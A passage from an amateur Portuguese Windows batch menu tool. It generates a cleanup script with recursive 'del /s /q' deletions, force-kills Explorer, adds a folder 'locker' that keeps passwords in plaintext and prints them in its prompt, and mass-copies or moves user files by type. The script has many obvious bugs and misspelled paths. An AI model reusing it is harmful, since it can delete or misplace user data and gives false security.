ECHO         del c:\~*.* /f >> %username%LIMPESA.CMD
ECHO         del c:\*. old /f >> %username%LIMPESA.CMD
ECHO         del c:\*.bak /f >> %username%LIMPESA.CMD
ECHO         del c:\"Documents and Setings"\%username%\Recent\*.* /s /q >> %username%LIMPESA.CMD
ECHO         del c:\"Documents and Setings"\%username%\Temp\*.* /s /q >> %username%LIMPESA.CMD
ECHO         del c:\"Documents and Setings"\%username%\Cookis\*.* /s /q >> %username%LIMPESA.CMD
ECHO         del c:\"Documents and Setings"\%username%\config~1\Temp\*.* /s /q >> %username%LIMPESA.CMD
ECHO         del c:\Windows\cookies\*.* /s /q >> %username%LIMPESA.CMD
ECHO         rd c:\Windows\Temp\*.* /s /q >> %username%LIMPESA.CMD
ECHO         md c:\\Windows\Temp >> %username%LIMPESA.CMD
ECHO         rd c:\"Documents and Setings"\%username%\config~1\Temp /s /q >> %username%LIMPESA.CMD
ECHO         md c:\"Documents and Setings"\%username%\config~1\Temp\ >> %username%LIMPESA.CMD
ECHO         rd c:\"Documents and Setings"\%username%\config~1\Temp\"Temporary Internet Files"\Content.IES >> %username%LIMPESA.CMD
ECHO         md c:\"Documents and Setings"\%username%\config~1\Temp\"Temporary Internet Files"\Content.IES >> %username%LIMPESA.CMD
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD 
ECHO start SystemPropertiesAdvanced.exe >> %username%LIMPESA.CMD
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD
ECHO start cleanmgr.exe >> %username%LIMPESA.CMD
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD
ECHO dfrgui >> %username%LIMPESA.CMD
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD
ECHO chkdsk /f /r  >> %username%LIMPESA.CMD       
ECHO ping -n 3 localhost^>nul >> %username%LIMPESA.CMD   

echo MsgBox " ARQUIVO [ %username%LIMPESA ] CRIADO COM SUCESSO NA SUA AREA DE TRABALHO ",vbOKOnly + vbInformation, "WYZARD CORP" >%temp%\wyz.vbs
start %temp%\wyz.vbs

GOTO MENU

:17 
::===================fechar explorer==========================
MODE 20,3
 TASKKILL /f /IM explorer.exe /t 
cls 
goto menu
::========================== esconder banco de dados ===================
:LOKPASS
attrib -r -h /s /d C:\Users\%Username%\Desktop\BANCO_DE_DADOS
CLS
@ ECHO OFF
COLOR 37
title COLOCAR SENHA EM PASTA
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo   V อ VER SENHAS
echo   N อ VER NOMES
echo   C อ CRIAR PASTAS  OCULTAS
echo   D อ CONSULTA OS DADOS
ECHO   BANCODADOS = CRIAR BANCO DE DADOS
ECHO   MEN VOLTAR PARA O MENU
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p op=digit sua opcao
if %op% equ V goto ty
if %op% equ v goto ty
if %op% equ C goto cri
if %op% equ c goto cri
if %op% equ n goto nom
if %op% equ N goto nom
if %op% equ d goto dad
if %op% equ D goto dad
if %op% equ MEN goto MEN
if %op% equ men goto MEN
if %op% equ bancodados goto maqke
if %op% equ BANCODADOS goto maqke
msg * /time 5 "COMANDO INVALIDO DIGITE ( C OU V ) E A TECLA ENTER PARA PRESSEGUIR"
goto LOKPASS
:cri
cd C:\Users\%Username%\Desktop
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    DIGITE O NOME DE SUA PASTA
echo.
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo.
set /p NOME=
CLS
echo.
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo    DIGITE UMA SENHA PARA SUA PASTA
echo.
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo.
set /p s=
 
echo CLS >> %NOME%.BAT
echo @ECHO OFF >> %NOME%.BAT
echo title PASTA %NOME% >> %NOME%.BAT
echo if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}" goto UNLOCK >> %NOME%.BAT
echo if NOT EXIST %NOME% goto MDLOCKER >> %NOME%.BAT
echo :CONFIRM >> %NOME%.BAT
echo echo Tem certeza que deseja trancar esta pasta(Y/N) >> %NOME%.BAT
echo set/p "cho=>" >> %NOME%.BAT
echo if %%cho%%==Y goto LOCK >> %NOME%.BAT
echo if %%cho%%==y goto LOCK >> %NOME%.BAT
echo if %%cho%%==n goto END >> %NOME%.BAT
echo if %%cho%%==N goto END >> %NOME%.BAT
echo echo Invalid choice. >> %NOME%.BAT
echo goto CONFIRM >> %NOME%.BAT
echo :LOCK >> %NOME%.BAT
echo ren %NOME% "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}" >> %NOME%.BAT
echo attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}" >> %NOME%.BAT
echo echo Pasta trancada >> %NOME%.BAT
echo msg * /time 5 "PASTA %NOME% BLOQUEADA COM SUCESSO" >> %NOME%.BAT
echo goto End >> %NOME%.BAT
echo :UNLOCK >> %NOME%.BAT
echo echo Entre com a senha >> %NOME%.BAT
echo set/p "pass=>" >> %NOME%.BAT
echo if NOT %%pass%%==  %s% goto FAIL >> %NOME%.BAT
echo attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}" >> %NOME%.BAT
echo ren "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}" %NOME% >> %NOME%.BAT
echo echo Destrnacada com sucesso >> %NOME%.BAT
echo msg * /time 5 "PASTA %NOME% DESBLOQUEADA COM SUCESSO" >> %NOME%.BAT
echo goto End >> %NOME%.BAT
echo :FAIL >> %NOME%.BAT
echo echo Senha Incorreta >> %NOME%.BAT
echo msg * /time 5 " SENHA INCORRETA !!! " >> %NOME%.BAT
echo goto end >> %NOME%.BAT
echo :MDLOCKER >> %NOME%.BAT
echo md %NOME% >> %NOME%.BAT
echo echo Pasta criada com sucesso >> %NOME%.BAT
echo msg * /time 5 "PASTA %NOME% CRIADA COM SUCESSO" >> %NOME%.BAT
echo goto End >> %NOME%.BAT
echo :End >> %NOME%.BAT 
 
echo @echo off  >> pasta_oculta.bat
echo :senha >> pasta_oculta.bat
echo. >> pasta_oculta.bat
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> pasta_oculta.bat 
echo   DIGITE A SENHA  \\  %s%  \\ PARA DESBLOQUER A PASTA \\ %NOME% >> pasta_oculta.bat
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> pasta_oculta.bat
echo. >> pasta_oculta.bat
echo.  >> pasta_oculta.bat
echo set /p op=DIGITE A SENHA  >> pasta_oculta.bat
echo if %%op%% equ %s% goto %NOME%%s% >> pasta_oculta.bat
echo  msg * /time 5 "SENHA ERRADA TENTE NOVAMENTE" >> pasta_oculta.bat
echo goto senha  >> pasta_oculta.bat
echo :%NOME%%s% cd C:\Users\%Username%\Desktop  >> pasta_oculta.bat 
echo attrib -h -s "%NOME%"  >>pasta_oculta.bat 
echo msg * /time 5 "PASTA %NOME% DESBLOQUEADA COM SUCESSO" >> pasta_oculta.bat 

::==========================  senha e nome  ========================================

echo. >> senha
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> senha 
echo   DIGITE A SENHA  \\  %s%  \\ PARA BLOQUER A PASTA \\ %NOME% >> senha
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> senha

::===================================================================================



if exist pasta_oculta.bat goto rx
echo @echo off  >>pasta_oculta.bat
echo :po   >>pasta_oculta.bat
echo set /p op=DIGITE O NOME DA PASTA >> pasta_oculta.bat  
echo if %%op%% equ %%op%% goto %%op%% >> pasta_oculta.bat   
echo if %%op%% equ %%op%% goto %%op%% >> pasta_oculta.bat 
echo msg * /time 5 "opcao invalida" >> pasta_oculta.bat   
echo goto po >> pasta_oculta.bat 
:rx 
echo :%NOME% >> pasta_oculta.bat
echo senha >> pasta_oculta.bat
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> pasta_oculta.bat 
echo echo   DIGITE A SENHA  \\ %s% \\  PARA BLOQUER A PASTA \\%NOME% \\>> pasta_oculta.bat
echo echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ >> pasta_oculta.bat
echo.
echo.
echo set /p op=DIGITE A SENHA  >> pasta_oculta.bat
echo if %%op%% equ %s% goto %NOME% >> pasta_oculta.bat
echo  msg * /time 5 "SENHA ERRADA TENTE NOVAMENTE" >>pasta_oculta.bat
echo goto %NOME% >> pasta_oculta.bat 
echo :%NOME%  >> pasta_oculta.bat 
echo cd C:\Users\%Username%\Desktop  >>pasta_oculta.bat 
echo attrib +h /s /d %NOME%  >>pasta_oculta.bat 
echo msg * /time 5 "PASTA %NOME% BLOQUEADA COM SUCESSO" >> pasta_oculta.bat 



::=========arquivos de ajuda====================================

::=================== senhas ====================================


echo ----------------------------------------------------- >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\SENHAS
echo NOME=%NOME% \\ DESBLO=%s% \\ DATA %date:~0,2%/%date:~3,2%/%date:~ 6,10% hora %time:~0,2%:%time:~3,2%  >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\SENHAS
echo ----------------------------------------------------- >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\SENHAS


::==================== nomes ====================================


echo ----------------------------------------------------- >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\NOMES
echo PASTA \\%NOME% \\DATA %date:~0,2%/%date:~3,2%/%date:~ 6,10% hora %time:~0,2%:%time:~3,2% >>C:\Users\%username%\Desktop\BANCO_DE_DADOS\NOMES
echo ----------------------------------------------------- >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\NOMES


::======================= BANCODADOS =============================


echo. >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK
echo ==================== %NOME% ===================== >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK 
echo. >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK
echo PASTA %NOME% CRIADA EM %date:~0,2%/%date:~3,2%/%date:~ 6,10% hora %time:~0,2%:%time:~3,2% >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK
echo ----------------------------------------------------- >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK
echo ______________SENHAS_________________________________ >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK
echo BLOQUEIO= %s% \\DESBLOQUEIO= %s% >>C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK
echo ----------------------------------------------------- >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK
echo _____________________________________________________ >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK
echo. >> C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK


goto LOKPASS

::=========== ver dados =======================
:dad

type C:\Users\%username%\Desktop\BANCO_DE_DADOS\DATABANK

pause >nul
goto LOKPASS

::==============================VER NOMES DE BANCO DE DADOS====================================

:nom


type C:\Users\%username%\Desktop\BANCO_DE_DADOS\NOMES

pause >nul
goto LOKPASS

::==============================VER SENHAS DE BANCO DE DADOS====================================

:ty

type C:\Users\%username%\Desktop\BANCO_DE_DADOS\SENHAS

pause >nul

goto LOKPASS

::==============================CRIAวรO DE BANCO DE DADOS====================================

:maqke
cd C:\Users\%username%\Desktop
md BANCO_DE_DADOS
cd BANCO_DE_DADOS
echo. >> DATABANK
echo. >> SENHAS
echo. >> NOMES
CD..
ECHO.
ECHO.
ECHO __________ CRIANDO BANCO DE DADOS __________

msg * /time 4 "BANCO DE DADOS CRIADO COM SUCESSO"

goto LOKPASS

:MEN 
attrib +r +h /s /d C:\Users\%Username%\Desktop\BANCO_DE_DADOS

GOTO MENU





::=================== BACKUP DE ARQUIVOS ==========================


:BAK
CLS
mode 80,25
color 02
time /t
date /t

echo   *************************************************************
echo   *                   ORGANIZAR ARQUIVOS                      *
echo   *************************************************************
echo   *                         AIRTON WIZARD                     *
echo   *                                                           *
echo   *                    1) backup                              *
echo   *                    2) informa๕es de pastas                *
echo   *                    3) informa็ใo de rede                  *
echo   *                    4) limpar o sistema                    *
echo   *                    5) organizar arquivo para suas pastas  *
echo   *                    6) sai                                 *
echo   *                    7) cores                               *
echo   *                                                           *
echo   *************************************************************
echo   *******                 DEDE WIZARD                 *********
echo   *******                                             *********
echo   *************************************************************
echo.   
echo.   
echo.   
echo.


SET /P OP=Digite sua op็โo? 
if %op% equ 1 goto backup
if %op% equ 2 goto infpasta
if %op% equ 3 goto infrede
if %op% equ 4 goto clean
if %op% equ 5 goto organizar
if %op% equ 6 goto sair
if %op% equ 7 goto cores

CLS
@ ECHO OFF
COLOR 47
mode 30,3

                                     
echo      OPCAO NAO EXISTE                       
                                                           

PAUSE >nul
CLS


GOTO BAK

:cores

mode 40,10
echo    0 = Preto        8 = Cinza
echo    1 = Azul         9 = Azul claro
echo    2 = Verde        A = Verde claro
echo    3 = Verde- gua   B = Verde- gua claro
echo    4 = Vermelho     C = Vermelho claro
echo    5 = Roxo         D = Lil s
echo    6 = Amarelo      E = Amarelo claro
echo    7 = Branco       F = Branco brilhante

set /p d= Digite numero=^> 
 

color %d%

cls
goto s



CD C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup



:backup
cls
COLOR 8A
time /t
date /t
echo   *************************************************************
echo   *                   BACKUP DE ARQUIVOS                      *
echo   *************************************************************
echo   *                         AIRTON WIZARD                     *
echo   *                                                           *
echo   *                    1) copiar arquivos                     *
echo   *                    2) mover arquivos                      *
echo   *                    3) voltar                              *
echo   *                                                           *
echo   *************************************************************
echo   *******                 DEDE WIZARD                 *********
echo   *******                                             *********
echo   *************************************************************
echo.   
echo.   
echo.   
echo.


SET /P OP=Digite sua op็โo? 
if %op% equ 1 goto cop
if %op% equ 2 goto move
if %op% equ 3 goto menu


cls

:cop
cls
@echo off
cls
COLOR 70
time /t
date /t
echo   *************************************************************
echo   *******                 copiando arquivos           *********
echo   *******                                             *********
echo   *************************************************************
echo.   
echo.   
echo.   
echo.
SET /P nome1=Digite o caminho da pasta

 cd "%nome1%"
if exist ORGANIZADOS ( msg * /time 4 "A PASTA ORGANIZADOS JA EXISTE") goto copy
md ORGANIZADOS
cd ORGANIZADOS
md musica
md imagem
cd imagem
md gif
md bmp
md png
cd "%nome1%"\ORGANIZADOS
md programa
cd programa
md rar
md texto
md pdf
md bat
md vbs 
cd "%nome1%"\ORGANIZADOS
md documentos
md videos
cd videos
md rmvb
md avi
md flv
md vob
md nrg
cd "%nome1%"

:copy


cd C:\Users\%username%


copy *.txt "%nome1%"\ORGANIZADOS\programa\texto
copy *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
copy *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
copy *.jpg "%nome1%"\ORGANIZADOS\imagem
copy *.png "%nome1%"\ORGANIZADOS\imagem\png
copy *.gif "%nome1%"\ORGANIZADOS\imagem\gif
copy *.rar "%nome1%"\ORGANIZADOS\programa\rar
copy *.bat "%nome1%"\ORGANIZADOS\programa\bat
copy *.exe "%nome1%"\ORGANIZADOS\programa
copy *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
copy *.zip "%nome1%"\ORGANIZADOS\programa
copy *.mp3 "%nome1%"\ORGANIZADOS\musica
copy *.wma "%nome1%"\ORGANIZADOS\musica
copy *.html "%nome1%"\ORGANIZADOS\documentos
copy *.htm "%nome1%"\ORGANIZADOS\documentos
copy *.reg "%nome1%"\ORGANIZADOS\documentos
copy *.dll "%nome1%"\ORGANIZADOS\documentos
copy *.avi "%nome1%"\ORGANIZADOS\videos\avi
copy *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
copy *.flv "%nome1%"\ORGANIZADOS\videos\flv
copy *.vob "%nome1%"\ORGANIZADOS\videos\vob
copy *.nrg "%nome1%"\ORGANIZADOS\videos\nrg

cd..

cd C:\Users\%username%\Documents



copy *.txt "%nome1%"\ORGANIZADOS\programa\texto
copy *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
copy *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
copy *.jpg "%nome1%"\ORGANIZADOS\imagem
copy *.png "%nome1%"\ORGANIZADOS\imagem\png
copy *.gif "%nome1%"\ORGANIZADOS\imagem\gif
copy *.rar "%nome1%"\ORGANIZADOS\programa\rar
copy *.bat "%nome1%"\ORGANIZADOS\programa\bat
copy *.exe "%nome1%"\ORGANIZADOS\programa
copy *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
copy *.zip "%nome1%"\ORGANIZADOS\programa
copy *.mp3 "%nome1%"\ORGANIZADOS\musica
copy *.wma "%nome1%"\ORGANIZADOS\musica
copy *.html "%nome1%"\ORGANIZADOS\documentos
copy *.htm "%nome1%"\ORGANIZADOS\documentos
copy *.reg "%nome1%"\ORGANIZADOS\documentos
copy *.dll "%nome1%"\ORGANIZADOS\documentos
copy *.avi "%nome1%"\ORGANIZADOS\videos\avi
copy *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
copy *.flv "%nome1%"\ORGANIZADOS\videos\flv
copy *.vob "%nome1%"\ORGANIZADOS\videos\vob
copy *.nrg "%nome1%"\ORGANIZADOS\videos\nrg


cd..


cd C:\Users\%username%\Downloads

copy *.txt "%nome1%"\ORGANIZADOS\programa\texto
copy *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
copy *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
copy *.jpg "%nome1%"\ORGANIZADOS\imagem
copy *.png "%nome1%"\ORGANIZADOS\imagem\png
copy *.gif "%nome1%"\ORGANIZADOS\imagem\gif
copy *.rar "%nome1%"\ORGANIZADOS\programa\rar
copy *.bat "%nome1%"\ORGANIZADOS\programa\bat
copy *.exe "%nome1%"\ORGANIZADOS\programa
copy *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
copy *.zip "%nome1%"\ORGANIZADOS\programa
copy *.mp3 "%nome1%"\ORGANIZADOS\musica
copy *.wma "%nome1%"\ORGANIZADOS\musica
copy *.html "%nome1%"\ORGANIZADOS\documentos
copy *.htm "%nome1%"\ORGANIZADOS\documentos
copy *.reg "%nome1%"\ORGANIZADOS\documentos
copy *.dll "%nome1%"\ORGANIZADOS\documentos
copy *.avi "%nome1%"\ORGANIZADOS\videos\avi
copy *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
copy *.flv "%nome1%"\ORGANIZADOS\videos\flv
copy *.vob "%nome1%"\ORGANIZADOS\videos\vob
copy *.nrg "%nome1%"\ORGANIZADOS\videos\nrg


cd..

cd C:\Users\%username%\Music

copy *.txt "%nome1%"\ORGANIZADOS\programa\texto
copy *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
copy *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
copy *.jpg "%nome1%"\ORGANIZADOS\imagem
copy *.png "%nome1%"\ORGANIZADOS\imagem\png
copy *.gif "%nome1%"\ORGANIZADOS\imagem\gif
copy *.rar "%nome1%"\ORGANIZADOS\programa\rar
copy *.bat "%nome1%"\ORGANIZADOS\programa\bat
copy *.exe "%nome1%"\ORGANIZADOS\programa
copy *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
copy *.zip "%nome1%"\ORGANIZADOS\programa
copy *.mp3 "%nome1%"\ORGANIZADOS\musica
copy *.wma "%nome1%"\ORGANIZADOS\musica
copy *.html "%nome1%"\ORGANIZADOS\documentos
copy *.htm "%nome1%"\ORGANIZADOS\documentos
copy *.reg "%nome1%"\ORGANIZADOS\documentos
copy *.dll "%nome1%"\ORGANIZADOS\documentos
copy *.avi "%nome1%"\ORGANIZADOS\videos\avi
copy *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
copy *.flv "%nome1%"\ORGANIZADOS\videos\flv
copy *.vob "%nome1%"\ORGANIZADOS\videos\vob
copy *.nrg "%nome1%"\ORGANIZADOS\videos\nrg

cd..

cd C:\Users\%username%\Pictures

copy *.txt "%nome1%"\ORGANIZADOS\programa\texto
copy *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
copy *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
copy *.jpg "%nome1%"\ORGANIZADOS\imagem
copy *.png "%nome1%"\ORGANIZADOS\imagem\png
copy *.gif "%nome1%"\ORGANIZADOS\imagem\gif
copy *.rar "%nome1%"\ORGANIZADOS\programa\rar
copy *.bat "%nome1%"\ORGANIZADOS\programa\bat
copy *.exe "%nome1%"\ORGANIZADOS\programa
copy *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
copy *.zip "%nome1%"\ORGANIZADOS\programa
copy *.mp3 "%nome1%"\ORGANIZADOS\musica
copy *.wma "%nome1%"\ORGANIZADOS\musica
copy *.html "%nome1%"\ORGANIZADOS\documentos
copy *.htm "%nome1%"\ORGANIZADOS\documentos
copy *.reg "%nome1%"\ORGANIZADOS\documentos
copy *.dll "%nome1%"\ORGANIZADOS\documentos
copy *.avi "%nome1%"\ORGANIZADOS\videos\avi
copy *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
copy *.flv "%nome1%"\ORGANIZADOS\videos\flv
copy *.vob "%nome1%"\ORGANIZADOS\videos\vob
copy *.nrg "%nome1%"\ORGANIZADOS\videos\nrg


cd..

cd C:\Users\%username%\Videos

copy *.txt "%nome1%"\ORGANIZADOS\programa\texto
copy *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
copy *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
copy *.jpg "%nome1%"\ORGANIZADOS\imagem
copy *.png "%nome1%"\ORGANIZADOS\imagem\png
copy *.gif "%nome1%"\ORGANIZADOS\imagem\gif
copy *.rar "%nome1%"\ORGANIZADOS\programa\rar
copy *.bat "%nome1%"\ORGANIZADOS\programa\bat
copy *.exe "%nome1%"\ORGANIZADOS\programa
copy *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
copy *.zip "%nome1%"\ORGANIZADOS\programa
copy *.mp3 "%nome1%"\ORGANIZADOS\musica
copy *.wma "%nome1%"\ORGANIZADOS\musica
copy *.html "%nome1%"\ORGANIZADOS\documentos
copy *.htm "%nome1%"\ORGANIZADOS\documentos
copy *.reg "%nome1%"\ORGANIZADOS\documentos
copy *.dll "%nome1%"\ORGANIZADOS\documentos
copy *.avi "%nome1%"\ORGANIZADOS\videos\avi
copy *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
copy *.flv "%nome1%"\ORGANIZADOS\videos\flv
copy *.vob "%nome1%"\ORGANIZADOS\videos\vob
copy *.nrg "%nome1%"\ORGANIZADOS\videos\nrg


  \m.vbs "processo concluido"

goto menu

copiando arquivos ocultos 
[entrar na unidade]:
[unidade]:dir/ah
{entrar na unidade e ser copiada} xcopy*.* /s/e/f [destino  dos arquivos ]
:exit


:move

@echo off
cls
COLOR 40
time /t
date /t
echo   *************************************************************
echo   *******                 movendo arquivos            *********
echo   *******                                             *********
echo   *************************************************************
echo.   
echo.   
echo.   
echo.
SET /P nome1=Digite o caminho da pasta

 cd "%nome1%"
if exist ORGANIZADOS (goto ac) els
md ORGANIZADOS
cd ORGANIZADOS
md musica
md imagem
cd imagem
md gif
md bmp
md png
cd "%nome1%"\ORGANIZADOS
md programa
cd programa
md rar
md texto
md pdf
md bat
md vbs 
cd "%nome1%"\ORGANIZADOS
md documentos
md videos
cd videos
md rmvb
md avi
md flv
md vob
md nrg
cd "%nome1%"

:ac


cd C:\Users\%username%


move *.txt "%nome1%"\ORGANIZADOS\programa\texto
move *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
move *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
move *.jpg "%nome1%"\ORGANIZADOS\imagem
move *.png "%nome1%"\ORGANIZADOS\imagem\png
move *.gif "%nome1%"\ORGANIZADOS\imagem\gif
move *.rar "%nome1%"\ORGANIZADOS\programa\rar
move *.bat "%nome1%"\ORGANIZADOS\programa\bat
move *.exe "%nome1%"\ORGANIZADOS\programa
move *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
move *.zip "%nome1%"\ORGANIZADOS\programa
move *.mp3 "%nome1%"\ORGANIZADOS\musica
move *.wma "%nome1%"\ORGANIZADOS\musica
move *.html "%nome1%"\ORGANIZADOS\documentos
move *.htm "%nome1%"\ORGANIZADOS\documentos
move *.reg "%nome1%"\ORGANIZADOS\documentos
move *.dll "%nome1%"\ORGANIZADOS\documentos
move *.avi "%nome1%"\ORGANIZADOS\videos\avi
move *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
move *.flv "%nome1%"\ORGANIZADOS\videos\flv
move *.vob "%nome1%"\ORGANIZADOS\videos\vob
move *.nrg "%nome1%"\ORGANIZADOS\videos\nrg
pause
 
cd..

cd C:\Users\%username%\Documents



move *.txt "%nome1%"\ORGANIZADOS\programa\texto
move *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
move *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
move *.jpg "%nome1%"\ORGANIZADOS\imagem
move *.png "%nome1%"\ORGANIZADOS\imagem\png
move *.gif "%nome1%"\ORGANIZADOS\imagem\gif
move *.rar "%nome1%"\ORGANIZADOS\programa\rar
move *.bat "%nome1%"\ORGANIZADOS\programa\bat
move *.exe "%nome1%"\ORGANIZADOS\programa
move *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
move *.zip "%nome1%"\ORGANIZADOS\programa
move *.mp3 "%nome1%"\ORGANIZADOS\musica
move *.wma "%nome1%"\ORGANIZADOS\musica
move *.html "%nome1%"\ORGANIZADOS\documentos
move *.htm "%nome1%"\ORGANIZADOS\documentos
move *.reg "%nome1%"\ORGANIZADOS\documentos
move *.dll "%nome1%"\ORGANIZADOS\documentos
move *.avi "%nome1%"\ORGANIZADOS\videos\avi
move *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
move *.flv "%nome1%"\ORGANIZADOS\videos\flv
move *.vob "%nome1%"\ORGANIZADOS\videos\vob
move *.nrg "%nome1%"\ORGANIZADOS\videos\nrg

cd..


cd C:\Users\%username%\Downloads



move *.txt "%nome1%"\ORGANIZADOS\programa\texto
move *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
move *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
move *.jpg "%nome1%"\ORGANIZADOS\imagem
move *.png "%nome1%"\ORGANIZADOS\imagem\png
move *.gif "%nome1%"\ORGANIZADOS\imagem\gif
move *.rar "%nome1%"\ORGANIZADOS\programa\rar
move *.bat "%nome1%"\ORGANIZADOS\programa\bat
move *.exe "%nome1%"\ORGANIZADOS\programa
move *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
move *.zip "%nome1%"\ORGANIZADOS\programa
move *.mp3 "%nome1%"\ORGANIZADOS\musica
move *.wma "%nome1%"\ORGANIZADOS\musica
move *.html "%nome1%"\ORGANIZADOS\documentos
move *.htm "%nome1%"\ORGANIZADOS\documentos
move *.reg "%nome1%"\ORGANIZADOS\documentos
move *.dll "%nome1%"\ORGANIZADOS\documentos
move *.avi "%nome1%"\ORGANIZADOS\videos\avi
move *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
move *.flv "%nome1%"\ORGANIZADOS\videos\flv
move *.vob "%nome1%"\ORGANIZADOS\videos\vob
move *.nrg "%nome1%"\ORGANIZADOS\videos\nrg

cd..

cd C:\Users\%username%\Music

move *.txt "%nome1%"\ORGANIZADOS\programa\texto
move *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
move *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
move *.jpg "%nome1%"\ORGANIZADOS\imagem
move *.png "%nome1%"\ORGANIZADOS\imagem\png
move *.gif "%nome1%"\ORGANIZADOS\imagem\gif
move *.rar "%nome1%"\ORGANIZADOS\programa\rar
move *.bat "%nome1%"\ORGANIZADOS\programa\bat
move *.exe "%nome1%"\ORGANIZADOS\programa
move *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
move *.zip "%nome1%"\ORGANIZADOS\programa
move *.mp3 "%nome1%"\ORGANIZADOS\musica
move *.wma "%nome1%"\ORGANIZADOS\musica
move *.html "%nome1%"\ORGANIZADOS\documentos
move *.htm "%nome1%"\ORGANIZADOS\documentos
move *.reg "%nome1%"\ORGANIZADOS\documentos
move *.dll "%nome1%"\ORGANIZADOS\documentos
move *.avi "%nome1%"\ORGANIZADOS\videos\avi
move *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
move *.flv "%nome1%"\ORGANIZADOS\videos\flv
move *.vob "%nome1%"\ORGANIZADOS\videos\vob
move *.nrg "%nome1%"\ORGANIZADOS\videos\nrg

cd..

cd C:\Users\%username%\Pictures

move *.txt "%nome1%"\ORGANIZADOS\programa\texto
move *.pdf "%nome1%"\ORGANIZADOS\programa\pdf
move *.bmp "%nome1%"\ORGANIZADOS\imagem\bmp
move *.jpg "%nome1%"\ORGANIZADOS\imagem
move *.png "%nome1%"\ORGANIZADOS\imagem\png
move *.gif "%nome1%"\ORGANIZADOS\imagem\gif
move *.rar "%nome1%"\ORGANIZADOS\programa\rar
move *.bat "%nome1%"\ORGANIZADOS\programa\bat
move *.exe "%nome1%"\ORGANIZADOS\programa
move *.vbs "%nome1%"\ORGANIZADOS\programa\vbs
move *.zip "%nome1%"\ORGANIZADOS\programa
move *.mp3 "%nome1%"\ORGANIZADOS\musica
move *.wma "%nome1%"\ORGANIZADOS\musica
move *.html "%nome1%"\ORGANIZADOS\documentos
move *.htm "%nome1%"\ORGANIZADOS\documentos
move *.reg "%nome1%"\ORGANIZADOS\documentos
move *.dll "%nome1%"\ORGANIZADOS\documentos
move *.avi "%nome1%"\ORGANIZADOS\videos\avi
move *.rmvb "%nome1%"\ORGANIZADOS\videos\rmvb
